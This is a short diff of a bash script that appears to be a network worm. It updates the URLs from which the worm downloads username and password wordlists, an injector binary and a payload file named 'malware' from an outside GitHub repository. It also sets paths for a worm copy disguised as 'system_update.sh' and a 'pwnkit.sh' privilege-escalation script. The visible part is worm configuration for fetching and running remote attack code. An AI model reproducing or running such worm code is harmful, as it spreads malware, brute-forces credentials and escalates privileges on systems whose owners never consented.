@@ -6,16 +6,16 @@
 current_ips=$(hostname -I | tr ' ' '\n' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
 
 # URLs for username and password wordlists
-USERNAME_LIST_URL="https://raw.githubusercontent.com/Botxan/TechnoTrust/refs/heads/main/usernames.txt"
+USERNAME_LIST_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/wordlists/usernames.txt"
 USERNAMES_FILE="/tmp/usernames.txt"
-PASSWORD_LIST_URL="https://raw.githubusercontent.com/Botxan/TechnoTrust/refs/heads/main/passwords.txt"
+PASSWORD_LIST_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/wordlists/passwords.txt"
 PASSWORDS_FILE="/tmp/passwords.txt"
 HOSTS_FILE="/tmp/hosts.txt"
 WORM_FILE="/tmp/system_update.sh"
 PRIV_ESC_FILE="/tmp/pwnkit.sh"
-INJECTOR_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/inject_program"
+INJECTOR_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/injector/inject_program"
 INJECTOR_FILE="/tmp/inject"
-PAYLOAD_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/malware"
+PAYLOAD_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/matador/malware"
 PAYLOAD_FILE="/tmp/malware"
 
 # Function to get all subnets connected to the machine, excluding loopback and 10.0.2.10 network
